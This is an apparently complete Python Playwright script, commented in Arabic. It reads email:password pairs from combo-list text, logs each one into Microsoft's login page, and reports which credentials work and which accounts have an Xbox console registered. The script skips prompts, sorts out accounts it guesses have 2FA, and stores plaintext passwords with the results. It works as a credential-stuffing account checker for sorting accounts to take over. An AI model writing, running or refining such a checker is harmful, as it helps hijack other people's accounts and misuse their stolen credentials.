import asyncio
import os
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

TIMEOUT_VAL = 60000  # 60 ثانية كحد أقصى للصفحة
PASSWORD_TIMEOUT = 30000  # 30 ثانية لانتظار حقل كلمة المرور

async def take_screenshot(page, email: str, suffix: str = "error"):
    """حفظ لقطة شاشة لتحليل المشكلة"""
    try:
        filename = f"screenshot_{email.replace('@', '_')}_{suffix}.png"
        await page.screenshot(path=filename, full_page=False)
        return filename
    except:
        return None

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    url = "https://www.xbox.com/en-US/play/consoles"
    try:
        await page.goto(url, timeout=TIMEOUT_VAL, wait_until="domcontentloaded")
        await asyncio.sleep(10) 
        
        text = (await page.inner_text("body")).lower()
        
        if "play your console remotely" in text or "start remote play" in text:
            return True, "يوجد جهاز", True
        if "set up your console" in text or "no consoles found" in text:
            return False, "مسجل ولا يوجد جهاز", True
            
        await asyncio.sleep(5)
        text = (await page.inner_text("body")).lower()
        if "play your console" in text:
            return True, "يوجد جهاز", True
            
    except Exception:
        pass
    return False, "مسجل (تحقق من الجهاز يدوياً)", True

async def handle_sign_in_options(page):
    """معالجة خيارات تسجيل الدخول الإضافية بشكل شامل"""
    # قائمة بالنصوص المحتملة لاختيار كلمة المرور
    password_selectors = [
        "text=/use your password/i",
        "text=/use a password/i",
        "text=/enter password/i",
        "text=/sign in with password/i",
        "button:has-text('password')",
        "a:has-text('password')",
        "text=/كلمة المرور/i",
        "text=/password/i"
    ]
    
    more_options_selector = "text=/more options/i"
    
    try:
        # إذا ظهرت خيارات إضافية، نضغط على "More options" أولاً
        more_btn = page.locator(more_options_selector)
        if await more_btn.count() > 0:
            await more_btn.first.click()
            await asyncio.sleep(1)
        
        # البحث عن أي زر/رابط يحتوي على نص يشير إلى كلمة المرور
        for selector in password_selectors:
            btn = page.locator(selector)
            if await btn.count() > 0:
                await btn.first.click()
                await asyncio.sleep(2)
                return True
        
        return False  # لم نجد أي خيار لكلمة المرور
    except:
        return False

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    screenshot_path = None
    
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(headless=headless, args=['--no-sandbox', '--disable-setuid-sandbox'])
        
        # استخدام User Agent حديث لتجنب الواجهة القديمة المعقدة
        modern_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        context = await browser.new_context(user_agent=modern_ua, viewport={'width': 1280, 'height': 720})
        page = await context.new_page()
        page.set_default_timeout(TIMEOUT_VAL)
        
        login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=15&wp=MBI_SSL&wreply=https:%2f%2fwww.xbox.com%2fen-US%2fplay%2fconsoles"
        
        await page.goto(login_url, wait_until="domcontentloaded")
        
        # إدخال البريد
        email_input = page.locator("input[name='loginfmt'], input[type='email']")
        await email_input.wait_for(state="visible", timeout=15000)
        await email_input.fill(account['email'])
        await page.locator("input[type='submit'], #idSIButton9").click()
        await asyncio.sleep(3)
        
        # معالجة أي خيارات إضافية (مثل "Use your password")
        await handle_sign_in_options(page)
        
        # انتظار حقل كلمة المرور
        password_input = page.locator("input[type='password'], input[name='passwd']")
        try:
            await password_input.wait_for(state="visible", timeout=PASSWORD_TIMEOUT)
        except PlaywrightTimeoutError:
            # إذا لم يظهر حقل كلمة المرور، قد يكون هناك طلب تحقق أو خطأ
            screenshot_path = await take_screenshot(page, account['email'], "no_password_field")
            raise Exception(f"لم يظهر حقل كلمة المرور بعد {PASSWORD_TIMEOUT/1000} ثانية - ربما 2FA أو حساب معطل. شاهد: {screenshot_path}")
        
        await password_input.fill(account['password'])
        await page.locator("input[type='submit'], #idSIButton9").click()
        await asyncio.sleep(5)
        
        # معالجة "Stay signed in"
        try:
            yes_btn = page.locator("input[value='Yes'], #idSIButton9")
            if await yes_btn.is_visible(timeout=5000):
                await yes_btn.click()
                await asyncio.sleep(2)
        except:
            pass
        
        # التحقق من وجود خطأ في كلمة المرور
        body_text = (await page.inner_text("body")).lower()
        if "incorrect password" in body_text or "wrong password" in body_text:
            result['console_info'] = "كلمة مرور خاطئة"
            result['success'] = False
            await browser.close()
            await p.stop()
            return result
        
        # فحص الجهاز
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info
        
        await browser.close()
        await p.stop()
        
    except Exception as e:
        error_msg = str(e)
        # اختصار رسالة الخطأ إذا كانت طويلة
        if "Timeout" in error_msg and "password" in error_msg:
            result['console_info'] = f"لم يظهر حقل كلمة المرور - ربما الحساب مفعل عليه حماية إضافية (2FA) أو معطل"
        else:
            result['console_info'] = f"خطأ: {error_msg[:80]}"
        result['success'] = False
        if p:
            await p.stop()
    
    # حذف لقطة الشاشة بعد استخدامها (اختياري)
    if screenshot_path and os.path.exists(screenshot_path):
        # يمكنك الاحتفاظ بها للتصحيح
        pass
    
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append({'email': parts[0].strip(), 'password': parts[1].strip()})
    return accounts
